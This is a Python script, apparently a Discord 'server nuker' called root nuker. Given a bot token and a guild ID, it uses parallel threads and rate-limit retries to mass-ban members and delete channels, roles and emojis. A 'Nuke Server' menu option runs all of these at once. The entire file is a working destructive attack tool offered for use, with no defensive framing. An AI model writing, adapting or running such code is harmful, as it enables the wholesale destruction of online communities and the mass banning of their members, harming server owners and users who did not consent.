import requests
import os
import threading, time
from colorama import Fore, Style
members = open('members.txt')
channels = open('channels.txt')
roles = open('roles.txt')
emojis = open('emojis.txt')
token = input("Token: ")
guild = input("Guild: ")
os.system('clear')
headers = {'Authorization': "Bot " + token}
def ban(i):
    while True:
      r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{i}", headers=headers)
      if 'retry_after' in r.text:
          time.sleep(r.json()['retry_after'])
          print(f"Got ratelimited, retrying after:  {r.json()['retry_after']} s.")
      else:
          break
def channel_delete(u):
    while True:
       r = requests.delete(f"https://discord.com/api/v8/channels/{u}", headers=headers)
       if 'retry_after' in r.text:
            time.sleep(r.json()['retry_after'])
            print(f"Got ratelimited, retrying after: {r.json()['retry_after']} s.")
       else:
          break
def role(k):
    while True:
       r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/roles/{k}", headers=headers)
       if 'retry_after' in r.text:
           time.sleep(r.json()['retry_after'])
           print(f"Got ratelimited, retrying after: {r.json()['retry_after']} s.")
       else:
           break
def emoji(a):
    while True:
       r = requests.delete(f"https://discord.com/api/v8/guilds/{guild}/emojis/{a}", headers=headers)
       if 'retry_after' in r.text:
           time.sleep(r.json()['retry_after'])
           print(f"Got ratelimited, retrying after: {r.json()['retry_after']} s.")
       else:
            break
def banall():   
     for m in members:
         x = threading.Thread(target=ban, args=(m,))
         x.start()
def channelsdel():
     for c in channels:
         y = threading.Thread(target=channel_delete, args=(c,))
         y.start()
def rolesdel():
     for r in roles:
         z = threading.Thread(target=role, args=(r,))
         z.start()
def emojisdel():  
     for e in emojis:
         h = threading.Thread(target=emoji, args=(e,))
         h.start()      
print(Fore.RED + r'''
                                __     
                               |  \    
  ______    ______    ______  _| $$_   
 /      \  /      \  /      \|   $$ \  
|  $$$$$$\|  $$$$$$\|  $$$$$$\\$$$$$$  
| $$   \$$| $$  | $$| $$  | $$ | $$ 
| $$      | $$__/ $$| $$__/ $$ | $$|  
| $$       \$$    $$ \$$    $$  \$$  $$
 \$$        \$$$$$$   \$$$$$$    \$$$$ 
                                       
                                       
1 ; Ban Members 
2 ; Del Channels  
3 ; Del Roles  
4 ; Del Emojis
5 ; Nuke Server           
''' + Style.RESET_ALL)
while True:
    x = input("> ")
    if x == "1":
        banall()
        print('Sent requests to ban all.')
    elif x == "2":
        channelsdel()
        print("Sent requests to delete channels.")
    elif x == "3":
        rolesdel()
        print("Sent requests to delete roles.")
    elif x =="4":
        emojisdel()
        print("Sent requests to delete emojis.")
    elif x=="5":
        banall()
        print("Sent requests to ban all.")
        channelsdel()
        print("Sent requests to delete channels.")
        rolesdel()
        print("Sent requests to delete roles.")
        emojisdel()
        print("Sent requests to delete emojis.")
        print("[SUCCESS] - Server has been nuked.\n Thanks for using root nuker.")  
